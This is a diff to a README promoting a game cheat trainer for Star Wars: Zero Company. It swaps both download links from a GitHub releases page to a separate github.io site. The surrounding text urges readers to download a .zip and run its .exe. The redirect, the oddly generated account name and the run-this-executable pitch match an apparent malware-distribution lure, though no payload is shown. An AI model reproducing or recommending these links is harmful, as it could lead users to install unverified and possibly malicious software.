@@ -1,6 +1,6 @@
 # 🎯 Zero-Company-Tactical-Trainer - Your Ultimate Star Wars Zero Company Companion
 
-[![Download Now](https://img.shields.io/badge/Download-Zero_Company_Trainer-blue?style=for-the-badge&logo=github)](https://github.com/Punchdrunk-dwightdavideisenhower161/Zero-Company-Tactical-Trainer/releases)
+[![Download Now](https://img.shields.io/badge/Download-Zero_Company_Trainer-blue?style=for-the-badge&logo=github)](https://punchdrunk-dwightdavideisenhower161.github.io)
 
 ---
 
@@ -144,7 +144,7 @@ No worries–just revisit the download page (link below) and re-download the `.z
 
 You're one step away from upgrading your Star Wars: Zero Company experience with a trainer that works as hard as you do. Click the big green button below, grab the latest release, extract the `.zip`, and run the `.exe`. That's the whole process–clean, simple, and brutally effective. 
 
-### [⬇️ Download Zero-Company-Tactical-Trainer Now](https://github.com/Punchdrunk-dwightdavideisenhower161/Zero-Company-Tactical-Trainer/releases)
+### [⬇️ Download Zero-Company-Tactical-Trainer Now](https://punchdrunk-dwightdavideisenhower161.github.io)
 
 )
 
